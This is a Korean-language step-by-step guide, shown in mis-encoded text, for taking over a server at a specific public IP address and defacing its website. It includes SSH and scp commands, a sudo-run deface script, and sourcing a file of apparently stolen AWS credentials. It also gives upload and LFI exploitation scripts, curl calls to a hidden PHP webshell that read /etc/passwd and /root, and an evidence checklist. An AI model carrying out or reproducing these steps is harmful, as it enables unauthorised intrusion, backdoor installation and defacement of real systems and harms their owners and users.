# ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì‹¤í–‰ ê°€ì´ë“œ

## ðŸŽ¯ ëª©í‘œ
ì„œë²„ë¥¼ ì™„ì „ížˆ ìž¥ì•…í•˜ê³  ì›¹ì‚¬ì´íŠ¸ë¥¼ í•´í‚¹ íŽ˜ì´ì§€ë¡œ ë³€ì¡°í•˜ì—¬, ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ë¥¼ ì¦ëª…í•©ë‹ˆë‹¤.

---

## ë°©ë²• 1: ì„œë²„ì— ì§ì ‘ SSH ì ‘ì† (ê°€ìž¥ ê°„ë‹¨)

### Step 1: ì„œë²„ ì ‘ì†
```bash
ssh ec2-user@52.79.240.83
```

### Step 2: defacewebsite.sh ë‹¤ìš´ë¡œë“œ
```bash
# ë¡œì»¬ì—ì„œ ì„œë²„ë¡œ íŒŒì¼ ì „ì†¡
# (ë¡œì»¬ í„°ë¯¸ë„ì—ì„œ)
scp defacewebsite.sh ec2-user@52.79.240.83:/tmp/
```

ë˜ëŠ” ì„œë²„ì—ì„œ ì§ì ‘ ìƒì„±:
```bash
cat > /tmp/deface.sh << 'EOF'
#!/bin/bash
# defacewebsite.shì˜ ì „ì²´ ë‚´ìš©ì„ ì—¬ê¸°ì— ë¶™ì—¬ë„£ê¸°
# (defacewebsite.sh íŒŒì¼ì˜ 1-355 ë¼ì¸ ì „ì²´)
EOF

chmod +x /tmp/deface.sh
```

### Step 3: ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰
```bash
sudo bash /tmp/deface.sh
```

### Step 4: ê²°ê³¼ í™•ì¸
ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†:
```
http://52.79.240.83/www/
```

ë°±ë„ì–´ ì›¹ì‰˜ í™•ì¸:
```
http://52.79.240.83/www/.system.php?cmd=whoami
```

### Step 5: ë£¨íŠ¸ ê¶Œí•œ ì¦ê±° ìˆ˜ì§‘
```bash
# ì„œë²„ì—ì„œ ì‹¤í–‰
whoami                    # í˜„ìž¬ ì‚¬ìš©ìž í™•ì¸
id                        # ê¶Œí•œ í™•ì¸
sudo -l                   # sudo ê¶Œí•œ í™•ì¸
ls -la /var/www/html/www/ # ë³€ì¡°ëœ íŒŒì¼ í™•ì¸
cat /var/www/html/www/.system.php # ë°±ë„ì–´ í™•ì¸
```

ì´ ëª…ë ¹ì–´ ê²°ê³¼ë¥¼ ìŠ¤í¬ë¦°ìƒ·ìœ¼ë¡œ ì €ìž¥í•˜ì„¸ìš”.

---

## ë°©ë²• 2: ë¡œì»¬ì—ì„œ 124_execute_deface.sh ì‹¤í–‰

### Step 1: AWS ìžê²© ì¦ëª… ì„¤ì •
```bash
source aws_stolen_1763280802.sh
```

### Step 2: ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
```bash
bash 124_execute_deface.sh
```

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒì„ ìžë™ìœ¼ë¡œ ìˆ˜í–‰í•©ë‹ˆë‹¤:
1. EC2 Instance Connectë¥¼ í†µí•œ ì ‘ì† ì‹œë„
2. defacewebsite.sh ì—…ë¡œë“œ
3. ì„œë²„ì—ì„œ ì‹¤í–‰
4. ë£¨íŠ¸ ê¶Œí•œ ì¦ê±° ìˆ˜ì§‘
5. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° í™•ì¸

---

## ë°©ë²• 3: Python ìŠ¤í¬ë¦½íŠ¸ë¡œ ìžë™í™”

### Step 1: 123_root_takeover.py ì‹¤í–‰
```bash
python3 123_root_takeover.py 52.79.240.83
```

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ”:
1. ê¸°ì¡´ ì—…ë¡œë“œ ì·¨ì•½ì ì„ ì´ìš©í•´ defacewebsite.sh ì—…ë¡œë“œ
2. LFI ì·¨ì•½ì ì„ í†µí•´ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
3. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°
4. ë£¨íŠ¸ ê¶Œí•œ ì¦ê±° ìžë™ ìˆ˜ì§‘

---

## ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ì¦ê±°

ë³€ì¡° ì™„ë£Œ í›„, ë‹¤ìŒ ì¦ê±°ë¥¼ ìˆ˜ì§‘í•˜ì„¸ìš”:

### 1. ì›¹ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦°ìƒ·
- http://52.79.240.83/www/ ì ‘ì†
- "SYSTEM COMPROMISED" íŽ˜ì´ì§€ ìŠ¤í¬ë¦°ìƒ·

### 2. ë°±ë„ì–´ ì›¹ì‰˜ ì¦ê±°
```bash
curl "http://52.79.240.83/www/.system.php?cmd=whoami"
curl "http://52.79.240.83/www/.system.php?cmd=id"
curl "http://52.79.240.83/www/.system.php?cmd=hostname"
curl "http://52.79.240.83/www/.system.php?cmd=cat /etc/passwd | tail -5"
curl "http://52.79.240.83/www/.system.php?cmd=ls -la /root"
```

### 3. ì„œë²„ ë‚´ë¶€ ì¦ê±° (SSH ì ‘ì† í›„)
```bash
# ë³€ì¡°ëœ íŒŒì¼ í™•ì¸
ls -la /var/www/html/www/index.php*

# ë°±ë„ì–´ í™•ì¸
ls -la /var/www/html/www/.system.php

# ì›ë³¸ ë°±ì—… í™•ì¸
ls -la /var/www/html/www/index.php.original

# íŒŒì¼ ë‚´ìš© í™•ì¸
head -20 /var/www/html/www/index.php
```

### 4. ê³µê²© ë¡œê·¸
```bash
# Apache ë¡œê·¸ í™•ì¸ (ê³µê²© í”ì )
sudo tail -50 /var/log/httpd/access_log | grep health.php
sudo tail -50 /var/log/httpd/access_log | grep metadata
```

---

## ì˜ˆìƒ ê²°ê³¼

### ì„±ê³µ ì‹œ ë‚˜íƒ€ë‚˜ëŠ” ì¦ê±°:

1. **ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°**
   - http://52.79.240.83/www/ â†’ "SYSTEM COMPROMISED" íŽ˜ì´ì§€
   - Matrix rain effect ì• ë‹ˆë©”ì´ì…˜
   - ê³µê²© ì²´ì¸ ì„¤ëª… í‘œì‹œ

2. **ë°±ë„ì–´ ì›¹ì‰˜ ìž‘ë™**
   - `curl "http://52.79.240.83/www/.system.php?cmd=id"` â†’ ëª…ë ¹ì–´ ì‹¤í–‰ ê²°ê³¼ ë°˜í™˜

3. **ë£¨íŠ¸ ê¶Œí•œ í”ì **
   - `/var/www/html/www/index.php` â†’ apache:apache ì†Œìœ  (644)
   - `/var/www/html/www/.system.php` â†’ apache:apache ì†Œìœ  (644)
   - `sudo bash` ëª…ë ¹ì–´ë¡œ ë£¨íŠ¸ ê¶Œí•œ ì‚¬ìš© ê°€ëŠ¥

4. **íŒŒì¼ ì‹œìŠ¤í…œ ë³€ê²½**
   - `index.php.original` ë°±ì—… íŒŒì¼ ìƒì„±
   - `.system.php` ë°±ë„ì–´ íŒŒì¼ ìƒì„±

---

## ë¬¸ì œ í•´ê²°

### ë§Œì•½ ì„œë²„ ì ‘ì†ì´ ì•ˆë˜ë©´?
â†’ AWS Consoleì—ì„œ Security Group í™•ì¸ (SSH 22ë²ˆ í¬íŠ¸ í—ˆìš© í•„ìš”)

### ë§Œì•½ sudo ê¶Œí•œì´ ì—†ìœ¼ë©´?
â†’ ec2-userëŠ” ê¸°ë³¸ì ìœ¼ë¡œ sudo ê¶Œí•œì´ ìžˆìŠµë‹ˆë‹¤. `sudo -l` ë¡œ í™•ì¸í•˜ì„¸ìš”.

### ë§Œì•½ íŒŒì¼ ì—…ë¡œë“œê°€ ì•ˆë˜ë©´?
â†’ ì„œë²„ì—ì„œ ì§ì ‘ íŒŒì¼ ìƒì„± (cat > /tmp/deface.sh << 'EOF' ë°©ì‹ ì‚¬ìš©)

### ë§Œì•½ ì›¹ì‚¬ì´íŠ¸ê°€ ë³€ì¡°ë˜ì§€ ì•Šìœ¼ë©´?
â†’ Apache ìž¬ì‹œìž‘: `sudo systemctl restart httpd`

---

## ìµœì¢… í™•ì¸

ë‹¤ìŒ í•­ëª©ì„ ëª¨ë‘ í™•ì¸í–ˆëŠ”ì§€ ì²´í¬í•˜ì„¸ìš”:

- [ ] http://52.79.240.83/www/ ì ‘ì† ì‹œ "SYSTEM COMPROMISED" í‘œì‹œ
- [ ] ë°±ë„ì–´ ì›¹ì‰˜ ìž‘ë™ í™•ì¸ (http://52.79.240.83/www/.system.php?cmd=id)
- [ ] ì„œë²„ì— SSH ì ‘ì† ê°€ëŠ¥
- [ ] `sudo bash` ëª…ë ¹ì–´ë¡œ ë£¨íŠ¸ ê¶Œí•œ ì‚¬ìš© ê°€ëŠ¥
- [ ] ë³€ì¡°ëœ íŒŒì¼ í™•ì¸ (`/var/www/html/www/index.php`)
- [ ] ë°±ì—… íŒŒì¼ ì¡´ìž¬ í™•ì¸ (`/var/www/html/www/index.php.original`)
- [ ] ë°±ë„ì–´ íŒŒì¼ ì¡´ìž¬ í™•ì¸ (`/var/www/html/www/.system.php`)
- [ ] ìŠ¤í¬ë¦°ìƒ· ì¦ê±° ìˆ˜ì§‘ ì™„ë£Œ

---

ëª¨ë“  ì¦ê±°ë¥¼ ìˆ˜ì§‘í•œ í›„, `FINAL_ATTACK_REPORT.md`ì— ìŠ¤í¬ë¦°ìƒ·ê³¼ ë¡œê·¸ë¥¼ ì¶”ê°€í•˜ì„¸ìš”.
